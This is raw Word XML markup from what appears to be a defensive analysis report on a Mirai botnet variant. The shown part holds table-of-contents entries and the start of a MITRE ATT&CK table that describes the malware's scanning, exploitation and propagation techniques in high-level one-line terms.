              <w:instrText xml:space="preserve"> PAGEREF _Toc101284338 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6460D933" w14:textId="04F889E5" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284339" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Recommended Actions</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284339 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="72796F50" w14:textId="6FD9FCE1" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284340" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>CONCLUSION</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284340 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="37B03E95" w14:textId="059947F1" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284341" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284341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7F5DB0F8" w14:textId="076CB682" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284342" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Indicators Of Compromise</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284342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485B07F0" w14:textId="27896650" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284343" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools used</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284343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674C671D" w14:textId="005C759E" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284344" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284344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5283EC6C" w14:textId="791CB712" w:rsidR="00224482" w:rsidRDefault="000E78BF">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
        <w:p w14:paraId="07CD8F8D" w14:textId="77777777" w:rsidR="00224482" w:rsidRDefault="00224482">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
        </w:p>
        <w:p w14:paraId="0FDF0FD5" w14:textId="4A0E7961" w:rsidR="00224482" w:rsidRDefault="00224482">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
        </w:p>
        <w:p w14:paraId="0091A13F" w14:textId="77777777" w:rsidR="0026033A" w:rsidRDefault="0026033A">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
        </w:p>
        <w:p w14:paraId="6F971794" w14:textId="7408C79F" w:rsidR="008107D3" w:rsidRPr="00224482" w:rsidRDefault="00000000">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="7DC02981" w14:textId="12A84A22" w:rsidR="002A588A" w:rsidRDefault="006A1F82" w:rsidP="002A588A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc101284329"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="002A588A">
        <w:t>itre Att&amp;ck</w:t>
      </w:r>
      <w:r w:rsidR="004D1853">
        <w:t xml:space="preserve"> Matrix</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="36D5B9F6" w14:textId="767B299A" w:rsidR="002A588A" w:rsidRPr="00D50208" w:rsidRDefault="00B54FE6" w:rsidP="001E0D31">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6DF7FA7E" wp14:editId="12B3F105">
            <wp:extent cx="5943600" cy="459295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592955"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="001E0D31">
        <w:br/>
      </w:r>
      <w:r w:rsidR="001E0D31" w:rsidRPr="00D50208">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="007D39FE" w:rsidRPr="00D50208">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="001E0D31" w:rsidRPr="00D50208">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">.1 </w:t>
      </w:r>
      <w:r w:rsidR="005F080E" w:rsidRPr="00D50208">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidR="001E0D31" w:rsidRPr="00D50208">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F080E" w:rsidRPr="00D50208">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>MITRE ATT&amp;CK Navigator</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent1"/>
        <w:tblW w:w="9572" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1472"/>
        <w:gridCol w:w="1357"/>
        <w:gridCol w:w="1983"/>
        <w:gridCol w:w="4760"/>
      </w:tblGrid>
      <w:tr w:rsidR="00820A1B" w14:paraId="74183B64" w14:textId="77777777" w:rsidTr="003B6247">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25DDD2F0" w14:textId="26C5BDF5" w:rsidR="00820A1B" w:rsidRDefault="00820A1B" w:rsidP="00B06445">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Technique ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15701B8C" w14:textId="5425F66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Tactic</w:t>
            </w:r>
            <w:r w:rsidR="00820A1B">
              <w:t xml:space="preserve"> Name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49F203E0" w14:textId="25CC010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Technique</w:t>
            </w:r>
            <w:r w:rsidR="00820A1B">
              <w:t xml:space="preserve"> Name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0CAD6C16" w14:textId="77777777" w:rsidR="00820A1B" w:rsidRDefault="00820A1B" w:rsidP="00B06445">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00820A1B" w14:paraId="43666E54" w14:textId="77777777" w:rsidTr="003B6247">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72" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="60AB5C65" w14:textId="529507DD" w:rsidR="00820A1B" w:rsidRPr="00062EAB" w:rsidRDefault="00820A1B" w:rsidP="00B06445">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00062EAB">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>T1</w:t>
            </w:r>
            <w:r w:rsidR="00C670D4">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>583.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="031DC7A6" w14:textId="3473C180" w:rsidR="00820A1B" w:rsidRDefault="00C670D4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Resource Development</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="29046C47" w14:textId="2C787A12" w:rsidR="00820A1B" w:rsidRDefault="00C670D4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00C670D4">
              <w:t>Acquire Infrastructure: Botnet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41ED3065" w14:textId="188E1F45" w:rsidR="00820A1B" w:rsidRDefault="00C670D4" w:rsidP="00062EAB">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>This malware variant infects IoT devices to perform large DDoS attacks as a botnet</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E82790" w14:paraId="00BC870D"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0D384112" w14:textId="252E5836" w:rsidR="00E82790" w:rsidRDefault="00F45F6A" w:rsidP="00B06445">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F45F6A">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>T1190</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="42250796" w14:textId="3C1CDB93"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Initial Access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="21A0DA3D" w14:textId="710090C0"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Exploit Public-Facing Application</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="32E11A59" w14:textId="243EFEFF" w:rsidR="00E82790" w:rsidRDefault="00F45F6A" w:rsidP="00062EAB">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Mirai variant takes advantage of multiple unpatched </w:t>
            </w:r>
            <w:r w:rsidR="007D2283" w:rsidRPr="00423CFF">
              <w:t>design</w:t>
            </w:r>
            <w:r w:rsidR="00423CFF">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00423CFF">
              <w:t>vulnerabilities</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> in IoT Devices </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008611D0" w14:paraId="578DB6E2"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D6E9F4" w14:textId="0ACDBAD0" w:rsidR="008611D0" w:rsidRPr="008611D0" w:rsidRDefault="008611D0" w:rsidP="00B06445">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008611D0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>T1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>210</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3FDA11A7" w14:textId="1010773F"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Lateral Movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2BE40F9B" w14:textId="34430DEB"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Exploitation of Remote Services</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="67378246" w14:textId="1C8157DB" w:rsidR="008611D0" w:rsidRDefault="008611D0" w:rsidP="00062EAB">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">This </w:t>
            </w:r>
            <w:r w:rsidR="00643CD6">
              <w:t>M</w:t>
            </w:r>
            <w:r>
              <w:t>irai variant propagates itself to other IoT Devices via RCE (Remote Code Execution) Vulnerabilities</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00295672" w14:paraId="22BF5E03"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EA1074" w14:textId="1321FC1A" w:rsidR="00295672" w:rsidRPr="008611D0" w:rsidRDefault="00295672" w:rsidP="00B06445">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>T1203</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E85F3C8" w14:textId="06EA39A4" w:rsidR="00295672" w:rsidRDefault="00295672" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13E5F7A1" w14:textId="5875A786" w:rsidR="00295672" w:rsidRDefault="00295672" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Exploitation for Client Services</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7859A943" w14:textId="4C2885AC" w:rsidR="00295672" w:rsidRDefault="00295672" w:rsidP="00062EAB">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>This Mirai variant exploits known vulnerabilities in routers, cameras and other smart devices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005614C1" w14:paraId="6F139D3C"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73310BF9" w14:textId="6FE8437A" w:rsidR="005614C1" w:rsidRDefault="005614C1" w:rsidP="00B06445">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005614C1">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>T1046</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BA54DF0" w14:textId="3AD9D445" w:rsidR="005614C1" w:rsidRDefault="005614C1" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4FABBB0A" w14:textId="4B3737FB" w:rsidR="005614C1" w:rsidRDefault="005614C1" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Network Service Scanning</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A335A15" w14:textId="00ECFFCE" w:rsidR="005614C1" w:rsidRDefault="005614C1" w:rsidP="00062EAB">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">The malware scans TCP ports of random IP addresses and hosts </w:t>
            </w:r>
            <w:r w:rsidR="006705D4">
              <w:t>to find new vulnerable IoT Devices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005614C1" w14:paraId="1FDEA8BA"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5C2455F3" w14:textId="4164A647" w:rsidR="005614C1" w:rsidRPr="005614C1" w:rsidRDefault="005614C1" w:rsidP="00B06445">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>T1049</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79022C62" w14:textId="3F953933" w:rsidR="005614C1" w:rsidRDefault="005614C1" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
